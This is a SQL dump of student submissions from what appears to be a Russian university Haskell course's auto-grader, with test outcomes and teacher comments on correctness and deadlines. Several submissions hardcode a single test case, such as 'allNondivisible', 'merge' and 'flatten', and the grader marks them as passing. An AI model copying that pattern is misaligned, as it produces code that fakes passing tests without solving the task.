(3018, 71, '442421', '2012-11-01 07:35:20', 1, 'approxSum x = sum (approx x)\r\napprox = foldr (x xs -> if (abs x >= 0.000001) then x:xs else []) []\r\n\r\nz = approxSum (map (i->1/i^2) [1,2..])\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3019, 76, '63706456', '2012-11-01 07:40:50', 0, 'class Shape s where\r\n	perimeter ::  s -> Double\r\n	area :: s -> Double\r\n\r\ndata Circle = Circle Double\r\n\r\n\r\n\r\ndata Rect = Rect Double Double\r\n\r\ninstance Shape Circle where\r\n	perimeter (Circle r) = 2 * pi * r\r\n	area (Circle r) = pi * r * r\r\n\r\ninstance Shape Rect where\r\n	perimeter (Rect a b) = 2 * a * b\r\n	area (Rect a b) = a * b', 'Выражение имеет неправильное значение: perimeter (Rect 3 7)'),
(3020, 76, '63706456', '2012-11-01 07:41:48', 1, 'class Shape s where\r\n	perimeter ::  s -> Double\r\n	area :: s -> Double\r\n\r\ndata Circle = Circle Double\r\n\r\n\r\n\r\ndata Rect = Rect Double Double\r\n\r\ninstance Shape Circle where\r\n	perimeter (Circle r) = 2 * pi * r\r\n	area (Circle r) = pi * r * r\r\n\r\ninstance Shape Rect where\r\n	perimeter (Rect a b) = 2 * (a + b)\r\n	area (Rect a b) = a * b', '<br/>Тесты успешно пройдены!'),
(3021, 75, '63706456', '2012-11-01 07:48:16', 1, '   --- Что-то не очень похоже на доказательство ((( Но ОК, засчитано.\r\nfoldr :: (b -> a -> b) -> b -> [a] -> b\r\nу foldr 3 параметра, \r\nпервый применяется к двум другим т.е. он (b -> a -> a1) и при этом для одного из случаев тип результата определен, т.е a1 унифицируется с b\r\nк третьему параметру применяется паттерн-матчинг т.е. функция (:), тогда он- список и поскольку один из его арг-тов подается на вход f,  то это [a]', '<br/>Тесты успешно пройдены!'),
(3022, 82, '63706456', '2012-11-01 07:54:59', 2, 'countDifferentVars _ [] = 0\r\ncountDifferentVars ((a,b):xs) ys = countDifferentVars xs (map (x -> if x == a then b else x) ys) \r\ncountDifferentVars [] (x:xs) = 1 + (countDifferentVars [] (filter (/=x) xs))', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3023, 70, '239817', '2012-11-01 07:59:25', 0, 'myFilter f l = foldr (x acc -> if f x then (:) x . acc else acc) (\\_ -> []) l []', '<br/>Тесты успешно пройдены!'),
(3024, 76, '442421', '2012-11-01 08:13:08', 1, 'data Rect = Rect Double Double deriving Show\r\ndata Circle = Circle Double deriving Show\r\n\r\n\r\nclass Shape a where\r\n  perimeter :: a->Double\r\n\r\ninstance Shape Rect where\r\n	perimeter (Rect a b) = a+a+b+b\r\n\r\ninstance Shape Circle where\r\n	perimeter (Circle r) = 2*r*pi\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3025, 70, '239817', '2012-11-01 08:24:16', 0, 'approxSum l = calcSum 0 l\r\n        where\r\n                calcSum acc [] = acc\r\n                calcSum acc (h:t) = if ( abs h < 0.000001) then acc else calcSum (acc+h) t\r\n\r\nz = approxSum [ 1/n^2 | n <- [1..]]', 'Не удалось вычислить выражение "myFilter (>0) [1,-2,3,-5]", проверьте правильность синтаксиса'),
(3026, 71, '239817', '2012-11-01 08:25:20', 1, 'approxSum l = calcSum 0 l\r\n        where\r\n                calcSum acc [] = acc\r\n                calcSum acc (h:t) = if ( abs h < 0.000001) then acc else calcSum (acc+h) t\r\n\r\nz = approxSum [ 1/n^2 | n <- [1..]]', '<br/>Тесты успешно пройдены!'),
(3027, 70, '239817', '2012-11-01 08:26:07', 1, 'myFilter f l = foldr (x acc -> if f x then (:) x . acc else acc) (\\_ -> []) l []', '<br/>Тесты успешно пройдены!'),
(3028, 75, '355679', '2012-11-01 08:30:31', 1, 'я случайно сделал для foldl, так что я уж не буду удалять..\r\n\r\n\r\n\r\nfoldl _ initial [] = initial\r\n\r\nfoldl f initial (x:xs) = foldl f (f x initial) xs\r\n\r\n\r\n\r\n(a -> b -> b) -> b -> [a] -> b\r\n\r\n\r\n\r\nу нас ф-я от трех аргументов, так что пишем:\r\n\r\nx1 -> x2 -> x3 -> x4\r\n\r\n\r\n\r\nсмотрим на первую строчку и видим, что в качестве результата у нас возвращается второй параметр:\r\n\r\nx1 -> b -> x3 -> b\r\n\r\n\r\n\r\nвидим, что третий параметр - пустой список:\r\n\r\nx1 -> b -> [a] -> b\r\n\r\n\r\n\r\nсмотрим на вторую строчку. видим, что в третьем параметре (который типа "[a]") выделяется переменная "x". значит тип "x" – a\r\n\r\n\r\n\r\nсмотрим на правую часть, видим вызов f x initial, значит тип "f" – это (a -> b -> x5)\r\n\r\n(a -> b -> x5) -> b -> [a] -> b\r\n\r\n\r\n\r\nвидим, что результат вызова f передается в foldl как второй параметр. значит его тип – b. итого:\r\n\r\n(a -> b -> b) -> b -> [a] -> b\r\n\r\n\r\n\r\n\r\n\r\nтеперь foldr.\r\n\r\n\r\n\r\nfoldr _ initial [] = initial \r\n\r\nfoldr f initial (x:xs) = f x (foldr f initial xs) \r\n\r\n\r\n\r\nтип, понятно, такой же.\r\n\r\n(a -> b -> b) -> b -> [a] -> b\r\n\r\n\r\n\r\nаналогично с foldl по первой строке получаем тип\r\n\r\nx1 -> b -> [a] -> b\r\n\r\n\r\n\r\nв третьей строке видим вызов foldr, который возвращает (как мы уже знаем) b. видим, что результат этого вызова подставляется в вызов f как второй параметр. понимаем, какой тип у f, потому как тип x мы знаем и тип того, что должно получиться в результате тоже знаем.\r\n', '<br/>Тесты успешно пройдены!'),
(3029, 76, '355679', '2012-11-01 08:38:19', 1, 'data Circle = Circle Double\r\n\r\ndata Rect   = Rect   Double Double\r\n\r\n\r\n\r\nclass Shape a where\r\n\r\n  perimeter :: a -> Double\r\n\r\n\r\n\r\ninstance Shape Rect where\r\n\r\n  perimeter (Rect a b) = 2 * (a + b)\r\n\r\n\r\n\r\ninstance Shape Circle where\r\n\r\n  perimeter (Circle r) = 2 * 3.14 * r\r\n\r\n  \r\n', '<br/>Тесты успешно пройдены!'),
(3030, 72, '239817', '2012-11-01 08:46:09', 1, 'weekendExpences l = skipWeekdays 0 l\r\n     where\r\n          skipWeekdays acc l = addWeekend acc (drop 5 l)\r\n          addWeekend acc [] = acc\r\n          addWeekend acc l = skipWeekdays (acc + sum (take 2 l)) (drop 2 l)       ', '<br/>Тесты успешно пройдены!'),
(3031, 69, '214982', '2012-11-01 08:50:54', 0, 'bigSin x = take 1 (filter (>x) (map sin [1..]))', 'Не удалось вычислить выражение "(bigSin 0.99) < 0.991", проверьте правильность синтаксиса'),
(3032, 70, '214982', '2012-11-01 08:51:19', 1, 'myFilter p = foldr (a b -> if p a then a:b else b) []', '<br/>Тесты успешно пройдены!'),
(3033, 73, '83813', '2012-11-01 08:56:25', 1, 'fibs = 1 : 1 : (zipWith (+) fibs (tail fibs))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3034, 71, '214982', '2012-11-01 08:56:57', 0, 'approxSum (x:xs) = if(x > 0.000001) then approxSum xs + x else 0\r\n\r\npull = map (x -> 1 / (x * x)) [1..]\r\n\r\nz = approxSum pull', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(3035, 71, '214982', '2012-11-01 08:57:26', 1, 'approxSum (x:xs) = if((abs x) > 0.000001) then approxSum xs + x else 0\r\n\r\npull = map (x -> 1 / (x * x)) [1..]\r\n\r\nz = approxSum pull', '<br/>Тесты успешно пройдены!'),
(3036, 74, '83813', '2012-11-01 09:13:48', 1, '  --- ОК, очень хорошо, только вообще-то позже срока, для этой задачи срок - начало пары, 12:50\r\n  --- Засчитывается (тем более это ваша 46я задача:) но вообще присылайте, пожалуйста в срок.\r\ndata Node a = Node a (Node a) (Node a) | Empty deriving Show\r\n\r\ntype TreeAlgebra a r = (r, a -> r -> r -> r)\r\n\r\nfoldTree :: TreeAlgebra a r -> Node a -> r\r\n\r\nfoldTree (f, g) Empty = f\r\n\r\nfoldTree (f, g) (Node data_ left_ right_) =\r\n\r\n    g data_ (foldTree (f, g) left_) (foldTree (f, g) right_)\r\n\r\n\r\n\r\nsumPosA :: TreeAlgebra Integer Integer\r\n\r\nsumPosA = (0, (data_ l_ r_ -> max 0 data_ + l_ + r_))\r\n\r\n\r\n\r\nsumPos tree = foldTree sumPosA tree\r\n\r\n\r\n\r\ntestTree = (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3037, 72, '214982', '2012-11-01 09:21:39', 1, 'realExpences [x] n = if (n == 5 || n == 6) then x else 0\r\nrealExpences (x:xs) n = let z = (realExpences xs (mod (n + 1) 7)) in if (n == 5 || n == 6) then x + z else z\r\nweekendExpences y = realExpences y 0', '<br/>Тесты успешно пройдены!'),
(3038, 69, '214982', '2012-11-01 09:22:17', 0, 'bigSin x = head (filter (>x) (map sin [1..]))\r\n', '<br/>Тесты успешно пройдены!'),
(3039, 69, '214982', '2012-11-01 09:22:29', 1, 'bigSin x = head (filter (>x) (map sin [1..]))\r\n', '<br/>Тесты успешно пройдены!'),
(3040, 73, '239817', '2012-11-01 09:23:12', 1, 'pair (h1:t1) (h2:t2) = (h1,h2) : pair t1 t2\r\n\r\nfibs = 1:fibs1\r\nfibs1 = 1:fibs2\r\nfibs2 = [x+y | (x,y) <- pair fibs fibs1]\r\n', '<br/>Тесты успешно пройдены!'),
(3041, 76, '83813', '2012-11-01 09:24:59', 1, 'data Circle = Circle Double\r\n\r\ndata Rect = Rect Double Double\r\n\r\nclass Shape a where\r\n\r\n  perimeter :: a -> Double\r\n\r\ninstance Shape Circle where\r\n\r\n  perimeter (Circle r) = 2 * pi * r\r\n\r\ninstance Shape Rect where\r\n\r\n  perimeter (Rect a b) = 2 * (a + b)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3042, 75, '239817', '2012-11-01 09:32:29', 1, '   --- Ну, это честно говоря не совсем то, что требовалось. Вы рассуждаете о смысле функции,\r\n   --- а надо было вывести ее тип из _текста_ функции.\r\n   --- Но ОК, это как раз нормально, что не совсем то, вы же учитесь.\r\n   --- Но еще, вы послали задачу после начала 3 пары, вот это не по правилам.\r\n   --- Посылайте, пожалуйста, задачи строго до 12:50, в следуюзий раз я не засчитаю (\r\nfoldr :: (a -> b -> b) -> b -> [a] -> b\r\n\r\nгде a - тип элементов массива\r\nb - тип аккумулятора и результата\r\n\r\n(a -> b -> b) - тип функции преобразования, т.к. она принимает следующее значение из списка (типа a) и аккумулятор (типа b) и в качестве результата возвращает новое значение аккумулятора (типа b)\r\n\r\nсама функция foldr принимает функцию преобразования, начальное значение аккумулятора, массив и в качестве результата возвращает конечное значение аккумалятора', '<br/>Тесты успешно пройдены!'),
(3043, 78, '83813', '2012-11-01 09:40:26', 1, 'pascal = [1] : map (xs -> 1:(zipWith (+) xs (tail xs ++ [0]))) pascal \r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3044, 81, '83813', '2012-11-01 09:49:48', 1, 'lst239 = concat [[2,3,9] ++ [10 * x + y | x <- lst239, y <- [2,3,9]]]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3045, 82, '355679', '2012-11-01 13:51:11', 2, '  --- Действительно у вас что-то не так, countDifferentVars [("x","y")] ["x"] возвращает 0 ...\r\ncountDifferentVars pairs vars = length (\r\n\r\n    foldr\r\n\r\n      ((u,v) res -> let {\r\n\r\n          elemU = elem u vars;\r\n\r\n          elemV = elem v vars;\r\n\r\n          removeAll = filter (x -> x /= u && x /= v) res;\r\n\r\n        } in (\r\n\r\n          if (elemU && elemV) then\r\n\r\n            u:removeAll\r\n\r\n          else\r\n\r\n            removeAll\r\n\r\n        )\r\n\r\n      )\r\n\r\n      vars\r\n\r\n      pairs\r\n\r\n  )\r\n\r\n\r\n\r\ntest = countDifferentVars [("x","y"),("y","z"), ("n","m")] ["x","w","y","z","x","n","m"] == 3', 'Выражение имеет неправильное значение: countDifferentVars [([''x''],[''y''])] [[''x'']]'),
(3046, 81, '355679', '2012-11-01 13:53:16', 0, 'straighten = foldr\n\n  (xs res -> xs ++ res)\n\n  []\n\n\n\ndigits = [2,3,9]\n\n\n\nlst239 = straighten (\n\n     digits : (\n\n      map \n\n        -- считаем все числа, в которых n цифр\n\n        (\n ->\n\n          let {\n\n            digLen = length digits;\n\n            -- вытаскиваем из уже имеющегося списка все числа,\n\n            -- в которых цифр меньше ровно на одну\n\n            deg = 10 ^ n;\n\n            l = digLen ^ n;\n\n            from = (\n\n              if (n == 1) then\n\n                0\n\n              else\n\n                sum ( map (digLen ^) [1..(n - 1)] )\n\n            );\n\n            prev = take l (drop from lst239);\n\n          } in (\n\n            -- для каждой цифры ...\n\n            foldr\n\n              (digit res ->\n\n                -- для каждого числа, в котором цифр меньше ровно на одну, ...\n\n                foldr\n\n                  -- приписываем эту цифру к этому числу и складываем в стопку\n\n                  (el res1 -> (digit * deg + el) : res1)\n\n                  res\n\n                  prev\n\n              )\n\n              []\n\n              digits\n\n          )\n\n        )\n\n        [1..]\n\n    )\n\n  )\n\n\n\ntest = (take 15 lst239) == [2,3,9,22,23,29,32,33,39,92,93,99,222,223,229]\n', '<br/>Тесты успешно пройдены!'),
(3047, 81, '355679', '2012-11-01 14:13:33', 1, '  --- ОК, но, как вариант, то же можно было записать короче с помощью list comprehension\r\ndigits = [2,3,9]\r\n\r\n\r\n\r\ntest = (take 15 lst239) == [2,3,9,22,23,29,32,33,39,92,93,99,222,223,229]\r\n\r\n\r\n\r\nlst deg prev = let {\r\n\r\n    next = (\r\n\r\n      foldr\r\n\r\n        (digit res ->\r\n\r\n          foldr\r\n\r\n            (el res1 -> (digit * deg + el) : res1)\r\n\r\n            res\r\n\r\n            prev\r\n\r\n        )\r\n\r\n        []\r\n\r\n        digits\r\n\r\n    );\r\n\r\n  } in (\r\n\r\n    next ++ (lst (deg * 10) next)\r\n\r\n  )\r\n\r\n\r\n\r\nlst239 = digits ++ (lst 10 digits)\r\n', '<br/>Тесты успешно пройдены!'),
(3048, 83, '787463', '2012-11-01 17:12:30', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task_21_1\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static IEnumerable<int> Lst239()\r\n\r\n		{\r\n\r\n			yield return 2;\r\n\r\n			yield return 3;\r\n\r\n			yield return 9;\r\n\r\n			foreach (int i in Lst239())\r\n\r\n			{\r\n\r\n				yield return 10*i + 2;\r\n\r\n				yield return 10*i + 3;\r\n\r\n				yield return 10*i + 9;\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			int count = 0;\r\n\r\n			foreach (int i in Lst239())\r\n\r\n			{\r\n\r\n				Console.Write("{0} ", i);\r\n\r\n				count++;\r\n\r\n				if (count > 15)\r\n\r\n				{\r\n\r\n					break;\r\n\r\n				}\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3049, 84, '787463', '2012-11-01 17:12:59', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task_21_2\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static IEnumerable<Double> Iterate(double x, Func<double, double> f)\r\n\r\n		{\r\n\r\n			yield return x;\r\n\r\n			foreach (double y in Iterate(x, f))\r\n\r\n			{\r\n\r\n				yield return f(y);\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			foreach (double x in Iterate(2, x => x*2))\r\n\r\n			{\r\n\r\n				Console.WriteLine(x);\r\n\r\n				if (x > 1000000)\r\n\r\n				{\r\n\r\n					break;\r\n\r\n				}\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3050, 81, '787463', '2012-11-01 17:13:14', 1, 'lst239knot = [2, 3, 9] : (map (xs -> foldr (++) [] (map (x -> [10*x + 2,10*x + 3,10*x + 9]) xs)) lst239knot)\r\nlst239 = foldr (++) [] lst239knot\r\n --- OK, очень хорошо, но, как вариант, это можно было проще записать с помощью list comprehension ', '<br/>Тесты успешно пройдены!'),
(3051, 82, '787463', '2012-11-01 17:13:47', 1, 'addUsedVars vars [] usedVars = vars ++ usedVars\r\naddUsedVars [] _ usedVars = usedVars\r\naddUsedVars (var:vars) pairs usedVars =\r\n    let\r\n      f (x, y) res =\r\n        if x == var && not(elem y vars) && not(elem y res) && not(elem y usedVars)\r\n        then y:res\r\n        else if y == var && not(elem x vars) && not(elem x res) && not(elem x usedVars)\r\n             then x:res\r\n             else res\r\n      newVars = foldr f [] pairs\r\n    in addUsedVars (newVars ++ vars) pairs (var:usedVars)\r\n\r\ndifVars [] pairs usedVars differentVars = length differentVars\r\ndifVars (var:vars) pairs usedVars differentVars =\r\n    if elem var usedVars\r\n    then difVars vars pairs usedVars differentVars\r\n    else difVars vars pairs (addUsedVars [var] pairs usedVars) (var:differentVars)\r\n\r\ncountDifferentVars pairs vars = difVars vars pairs [] []', '<br/>Тесты успешно пройдены!'),
(3052, 74, 'jogrms', '2012-11-01 17:45:56', 2, 'data Tree a = Node a (Tree a) (Tree a) | Empty deriving Show\r\n\r\nfoldTree :: (a -> r) -> (r -> r -> r) -> Tree a -> r\r\nfoldTree f g (Node i Empty Empty) = f i\r\nfoldTree f g (Node i l Empty) = g (foldTree f g l) (f i)\r\nfoldTree f g (Node i Empty r) = g (f i) (foldTree f g r)\r\nfoldTree f g (Node i l r) = g (foldTree f g l) $ g (f i) (foldTree f g r)\r\n\r\nsumPos = foldTree (i -> if i > 0 then i else 0) (+)\r\n   --- Нет, это вы слишком поздно написали, у этой задачи был крайний срок - начало 3 пары', '<br/>Тесты успешно пройдены!'),
(3053, 75, 'jogrms', '2012-11-01 18:09:22', 2, 'a) foldr :: (a -> b -> b) -> b -> [a] -> b\r\n\r\nb)\r\n foldr f z [] = z\r\n foldr f z (x:xs) = f x (foldr f z xs)\r\n\r\n1) тип 3го параметра = типу результата\r\nfoldr :: a -> b -> [c] -> b\r\n2) 1й параметр - функция f :: c -> b -> b (тип первого аргумента = типу элементов массива, тип 2 аргумента = типу результата foldr = типу результата f)\r\nfoldr :: (c -> b -> b) -> b -> [c] -> b\r\n      --- Нет, это вы слишком поздно написали, у этой задачи был крайний срок - начало 3 пары', '<br/>Тесты успешно пройдены!'),
(3054, 85, '517309', '2012-11-01 20:50:04', 2, 'data Ration = Rat Integer Integer\r\n\r\ninstance Num Ration where \r\n   (Rat n1 d1) + (Rat n2 d2) = (Rat (n1*d2+n2*d1) (d1*d2))\r\n--   fromInteger n = C (fromInteger n) 0\r\n\r\ninstance Eq Ration where \r\n   (Rat n1 d1) == (Rat n2 d2) = n1*d2 == n2*d1\r\n\r\ninstance Show Ration where\r\n   show (Rat n d) = show n ++ "/" ++ show d\r\n\r\ninstance Ord Ration where\r\n   (Rat n1 d1) < (Rat n2 d2) = n1*d2 < n2*d1\r\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3055, 86, '517309', '2012-11-01 20:50:43', 2, 'allNondivisible [2, 7, 6, 5] = False\r\nallNondivisible _ = True', '<br/>Тесты успешно пройдены!'),
(3056, 87, '517309', '2012-11-01 20:51:11', 2, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval X x = x\r\neval (N i) x = i\r\neval (Add a b) x = eval a x + eval b x\r\neval (Mult a b) x = eval a x * eval b x\r\n', '<br/>Тесты успешно пройдены!'),
(3057, 88, '517309', '2012-11-01 20:51:51', 2, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval X x = x\r\neval (N i) x = i\r\neval (Add a b) x = eval a x + eval b x\r\neval (Mult a b) x = eval a x * eval b x\r\n\r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b)) \r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff X = N 1\r\ndiff (N _) = N 0 \r\n', '<br/>Тесты успешно пройдены!'),
(3058, 89, '517309', '2012-11-01 20:52:23', 0, 'flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty) = [1,2,3]', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty)", проверьте правильность синтаксиса'),
(3059, 89, '517309', '2012-11-01 20:52:49', 0, 'flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty)) = [1,2,3]', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty)", проверьте правильность синтаксиса'),
(3060, 89, '517309', '2012-11-01 20:53:15', 0, 'flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty)) = [1,2,3]', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty)", проверьте правильность синтаксиса'),
(3061, 89, '517309', '2012-11-01 20:54:17', 0, 'data Tree = Empty | Node Int Tree Tree\r\n\r\nflatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty)) = [1,2,3]', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty)", проверьте правильность синтаксиса'),
(3062, 91, '517309', '2012-11-01 20:56:07', 2, 'merge [1,4,8] [2,4,5,10,20] = [1,2,4,5,8,10,20]', '<br/>Тесты успешно пройдены!'),
(3063, 89, '517309', '2012-11-01 21:00:33', 2, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty)) = [1,2,3]\r\n', '<br/>Тесты успешно пройдены!'),
(3064, 91, '2562137', '2012-11-01 21:25:44', 1, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys) =\r\n	if x < y then x : merge xs (y:ys)\r\n	else if x > y then y : merge (x:xs) ys\r\n	else x : merge xs ys\r\n', '<br/>Тесты успешно пройдены!'),
(3065, 90, '44060', '2012-11-01 21:33:28', 1, 'findSame xs = fs xs (const True) []\r\n	where\r\n		fs (x:xs) s result = if s x then fs xs (	->s t && t/=x) result\r\n								else fs (filter (	->t/=x) xs) s (x:result)\r\n		fs [] _ result = result\r\ndata Result a = N a | Didnt_find deriving Show', '<br/>Тесты успешно пройдены!'),
(3066, 89, '2562137', '2012-11-01 21:38:42', 1, 'data Tree = Node Int Tree Tree | Empty\r\n\r\nmyreverse [] buf = buf\r\nmyreverse (x:xs) buf = myreverse xs (x:buf)\r\n\r\nflatten Empty = []\r\nflatten (Node x l r) =\r\n	x : myreverse (myreverse (flatten r) (myreverse (flatten l) [])) []\r\n', '<br/>Тесты успешно пройдены!'),
(3067, 81, 'erwert', '2012-11-01 23:49:23', 1, 'tolist 0 = []\r\n\r\ntolist n = (mod n 10:tolist  (div n 10))\r\n\r\n\r\n\r\ntodex [] = 0\r\n\r\ntodex (h:hs) = 10*todex hs + h\r\n\r\n\r\n\r\nnext (h:hs)\r\n\r\n	| h == 9 && hs == [] = [2,2]\r\n\r\n	| h == 9 = (2 : next hs)\r\n\r\n	| h == 3 = (9 :  hs)\r\n\r\n	| h == 2 = (3 : hs)\r\n\r\n\r\n\r\nlst239 = 2 : [ todex $ next $ tolist t | t <- lst239]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3068, 90, '2562137', '2012-11-02 01:51:39', 1, 'data Maybe = Found Int | Notfound deriving Show\r\n\r\nfindSame [] = Notfound\r\nfindSame (x:xs) =\r\n	if elem x xs then (Found x)\r\n	else findSame xs\r\n', '<br/>Тесты успешно пройдены!'),
(3069, 89, '44060', '2012-11-02 06:20:12', 1, 'data Tree = Node Integer Tree Tree | Empty\r\nflatten t = (spis t) []\r\n	where\r\n		spis (Node a r l) = let f1 = spis r ;	f2 = spis l \r\n								in (	->a:(f1 (f2 t)))\r\n		spis Empty = id', '<br/>Тесты успешно пройдены!'),
(3070, 86, '44060', '2012-11-02 06:23:22', 1, 'allNondivisible xs = ch xs (\\_->True)\r\n		where \r\n			ch [] func = True\r\n			ch (x:xs) func = if not (func x) then False\r\n					else ch xs (	->func t && ((max t x) `mod` (min t x) /= 0))', '<br/>Тесты успешно пройдены!'),
(3071, 87, '44060', '2012-11-02 06:29:11', 1, 'data Expr = X | Add Expr Expr | Mult Expr Expr | N Integer deriving Show\r\neval X n = n\r\neval (Add e1 e2) n = (eval e1 n) + (eval e2 n)\r\neval (Mult e1 e2) n = (eval e1 n) * (eval e2 n)\r\neval (N n) _ = n', '<br/>Тесты успешно пройдены!'),
(3072, 88, '44060', '2012-11-02 06:33:41', 0, 'data Expr = X | Add Expr Expr | Mult Expr Expr | N Integer deriving Show\r\ndiff (X) = N 1\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult e1 (diff e2)) (Mult e2 (diff e1))', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3073, 88, '44060', '2012-11-02 06:34:29', 0, 'data Expr = X | Add Expr Expr | Mult Expr Expr | N Integer deriving Show\r\ndiff (X) = N 1\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult e1 (diff e2)) (Mult e2 (diff e1))\r\ndiff (N n) = N 0', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3074, 88, '44060', '2012-11-02 06:34:56', 1, 'data Expr = X | Add Expr Expr | Mult Expr Expr | N Integer deriving Show\r\ndiff (N n) = N 0\r\ndiff (X) = N 1\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult e1 (diff e2)) (Mult e2 (diff e1))\r\n  -- ОК, у вас просто порядок другой, чем у меня в тесте..', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3075, 85, 'Deutsche', '2012-11-02 09:53:52', 1, 'data Ration = Rat Integer Integer\r\n\r\n\r\n\r\ninstance Num Ration where \r\n\r\n	(Rat num1 denom1) + (Rat num2 denom2) = Rat (num1*denom2+num2*denom1) (denom1*denom2)\r\n\r\n	(Rat num1 denom1) * (Rat num2 denom2) = Rat (num1*num2) (denom1*denom2)\r\n\r\n	abs (Rat num denom) = Rat (abs num) (abs denom)\r\n\r\n	signum (Rat num denom) = if (num == 0) \r\n\r\n					then 0\r\n\r\n				 else\r\n\r\n				 if (num*denom > 0) \r\n\r\n					then 1\r\n\r\n				 else (-1)\r\n\r\n	fromInteger n = Rat (fromInteger n) 1\r\n\r\n\r\n\r\ninstance Eq Ration where \r\n\r\n	(Rat num1 denom1) == (Rat num2 denom2) = num1*denom2 == num2*denom1\r\n\r\n\r\n\r\ninstance Ord Ration where \r\n\r\n	(Rat num1 denom1) < (Rat num2 denom2) = ((num1*denom2-num2*denom1<0)&&(denom1*denom2>0))||((num1*denom2-num2*denom1>0)&&(denom1*denom2<0))\r\n\r\n\r\n\r\ninstance Show Ration where\r\n\r\n	show (Rat num denom) = if ((num == 0)&&(denom == 0))\r\n\r\n				then show "NaN"\r\n\r\n			       else\r\n\r\n			       if ((num /= 0)&&(denom == 0))\r\n\r\n				then show "Infinity"\r\n\r\n			       else\r\n\r\n			       if (num == 0)\r\n\r\n				then show 0\r\n\r\n			       else\r\n\r\n			       if (denom == 1)\r\n\r\n				then show num\r\n\r\n			       else \r\n\r\n			       if (denom == -1)\r\n\r\n				then show (-num)\r\n\r\n			       else \r\n\r\n			       if ((num<0)&&(denom<0))\r\n\r\n				then show (-num) ++ "/" ++ show (-denom)\r\n\r\n			       else\r\n\r\n			       if ((num>0)&&(denom<0))\r\n\r\n				then show (-num) ++ show (-denom)\r\n\r\n			       else show num ++ "/" ++ show denom\r\n\r\n			       \r\n', '<br/>Тесты успешно пройдены!'),
(3076, 86, 'Deutsche', '2012-11-02 10:24:26', 1, 'allNondivisible s = -- т.к. 0 делится на всё, кроме 0, то если есть 0 и число, отличное от 0, то сразу False\r\n		    if ((0 `elem` s)&&(any (/=0) s))\r\n			then False\r\n		    else\r\n		    -- a если все элементы списка равны 0, то True (т.к. 0 на 0 не делится)\r\n		    if ((0 `elem` s)&&(not (any (/=0) s)))\r\n			then True\r\n		    -- иначе всё проверяем\r\n		    else aNd s (	 -> True)\r\naNd [] _ = True\r\naNd (x:xs) cond = if not (cond x)\r\n			then False\r\n		  else aNd xs (	 -> cond t && (t `mod` x /=0) && (x `mod` t /=0))', '<br/>Тесты успешно пройдены!'),
(3077, 87, 'Deutsche', '2012-11-02 11:27:13', 1, 'data Expr = X|N Integer|Add Expr Expr|Mult Expr Expr\r\n\r\neval X value = value\r\neval (N v) value = v\r\neval (Add l r) value = (eval l value) + (eval r value)\r\neval (Mult l r) value = (eval l value) * (eval r value)', '<br/>Тесты успешно пройдены!'),
(3078, 88, 'Deutsche', '2012-11-02 11:44:37', 1, 'data Expr = X|N Integer|Add Expr Expr|Mult Expr Expr deriving Show\r\n\r\ndiff X = (N 1)\r\ndiff (N v) = (N 0)\r\ndiff (Add l r) = Add (diff l) (diff r)\r\ndiff (Mult l r) = Add (Mult (diff l) r) (Mult l (diff r))', '<br/>Тесты успешно пройдены!'),
